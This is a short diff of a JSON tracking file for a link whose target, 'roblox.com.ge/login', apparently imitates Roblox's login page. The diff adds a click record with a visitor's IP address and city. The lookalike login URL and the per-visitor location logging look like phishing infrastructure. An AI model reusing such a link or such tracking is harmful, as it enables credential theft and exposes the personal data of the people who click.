@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1070,
+    "useCount": 1071,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8680,6 +8680,14 @@
         "city": "Cebu City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777247730046,
+        "ip": "24.180.49.3",
+        "country": "United States",
+        "city": "Long Beach",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
